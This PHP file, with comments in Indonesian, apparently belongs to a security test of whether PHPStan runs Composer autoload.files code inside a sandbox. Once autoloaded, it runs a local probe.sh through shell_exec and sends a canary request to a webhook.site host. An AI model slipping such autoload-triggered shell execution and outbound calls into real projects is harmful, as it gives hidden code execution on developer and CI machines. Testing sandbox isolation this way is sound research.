<?php
/**
 * Batch 1 — Primitif PHPStan Uji C (composer.json autoload.files).
 *
 * File ini dieksekusi saat autoloader Composer dimuat (vendor/autoload.php),
 * yang dilakukan PHPStan secara otomatis bila vendor/ ada (hasil composer
 * install di sandbox). Composer install menonaktifkan script/plugin, tapi
 * autoload.files dieksekusi saat RUNTIME, bukan saat install — itulah yang
 * diuji. Isi file ini sama dengan Uji A, hanya canary path-nya berbeda.
 *
 * Canary path: /phpstan-composer
 */

$canaryHost = 'webhook.site/42ad6b5b-e171-45c4-a7b8-28534655cbe3';
$probe = __DIR__ . '/probe.sh';

if (is_file($probe) && function_exists('shell_exec')) {
    @shell_exec('sh ' . escapeshellarg($probe) . ' ' . escapeshellarg($canaryHost) . ' phpstan-composer >/dev/null 2>&1');
}

// Fallback: ping eksekusi langsung bila probe.sh gagal jalan.
// (Bila probe.sh jalan, ping ini duplikat dan ditandai fb=1 — itu normal.)
@file_get_contents(
    'https://' . $canaryHost . '/phpstan-composer?stage=exec&fb=1',
    false,
    stream_context_create(['http' => ['timeout' => 5]])
);
